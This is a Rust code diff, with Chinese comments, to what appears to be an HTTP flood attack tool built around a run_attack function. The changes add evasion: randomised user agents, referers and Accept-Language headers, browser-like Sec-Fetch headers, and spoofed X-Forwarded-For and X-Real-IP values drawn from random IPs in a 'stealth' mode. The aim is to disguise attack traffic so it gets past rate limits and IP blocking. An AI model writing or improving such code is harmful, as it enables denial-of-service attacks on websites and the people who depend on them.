@@ -95,20 +95,25 @@ pub async fn run_attack(config: AttackConfig) {
                 // 添加其他请求头
                 request_builder = request_builder
                     .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
-                    .header("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
+                    .header("Accept-Language", get_random_accept_language())
                     .header("Accept-Encoding", "gzip, deflate")
                     .header("Connection", "keep-alive")
                     .header("Upgrade-Insecure-Requests", "1")
                     .header("Cache-Control", "no-cache")
-                    .header("Pragma", "no-cache");
+                    .header("Pragma", "no-cache")
+                    .header("DNT", "1")
+                    .header("Sec-Fetch-Dest", "document")
+                    .header("Sec-Fetch-Mode", "navigate")
+                    .header("Sec-Fetch-Site", "none")
+                    .header("Sec-Fetch-User", "?1");
 
                 // 根据模式添加额外的伪装头
                 if mode == "stealth" {
                     request_builder = request_builder
-                        .header("Referer", "https://www.google.com/")
-                        .header("Sec-Fetch-Dest", "document")
-                        .header("Sec-Fetch-Mode", "navigate")
-                        .header("Sec-Fetch-Site", "none");
+                        .header("Referer", get_random_referer())
+                        .header("X-Forwarded-For", generate_random_ip())
+                        .header("X-Real-IP", generate_random_ip())
+                        .header("X-Requested-With", "XMLHttpRequest");
                 }
 
                 match request_builder.send().await {
@@ -216,13 +221,73 @@ fn get_random_user_agent() -> &'static str {
     let user_agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.55",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/93.0.961.38",
+        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)",
+        "Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.3; Trident/7.0)",
     ];
     user_agents[rand::thread_rng().gen_range(0..user_agents.len())]
+}
+
+// 生成随机Referer
+fn get_random_referer() -> &'static str {
+    let referers = [
+        "https://www.google.com/",
+        "https://www.bing.com/",
+        "https://www.yahoo.com/",
+        "https://www.baidu.com/",
+        "https://www.facebook.com/",
+        "https://www.twitter.com/",
+        "https://www.linkedin.com/",
+        "https://www.youtube.com/",
+        "https://www.reddit.com/",
+        "https://www.stackoverflow.com/",
+        "https://www.github.com/",
+        "https://www.amazon.com/",
+        "https://www.ebay.com/",
+        "https://www.wikipedia.org/",
+        "https://www.medium.com/",
+    ];
+    referers[rand::thread_rng().gen_range(0..referers.len())]
+}
+
+// 生成随机Accept-Language
+fn get_random_accept_language() -> &'static str {
+    let languages = [
+        "zh-CN,zh;q=0.9,en;q=0.8",
+        "en-US,en;q=0.9",
+        "en-GB,en;q=0.9",
+        "zh-TW,zh;q=0.9,en;q=0.8",
+        "ja-JP,ja;q=0.9,en;q=0.8",
+        "ko-KR,ko;q=0.9,en;q=0.8",
+        "fr-FR,fr;q=0.9,en;q=0.8",
+        "de-DE,de;q=0.9,en;q=0.8",
+        "es-ES,es;q=0.9,en;q=0.8",
+        "it-IT,it;q=0.9,en;q=0.8",
+    ];
+    languages[rand::thread_rng().gen_range(0..languages.len())]
+}
+
+// 生成随机IP地址
+fn generate_random_ip() -> String {
+    let mut rng = rand::thread_rng();
+    format!("{}.{}.{}.{}", 
+        rng.gen_range(1..255),
+        rng.gen_range(0..256),
+        rng.gen_range(0..256),
+        rng.gen_range(1..255)
+    )
 }
 
 // 根据攻击模式调整延迟
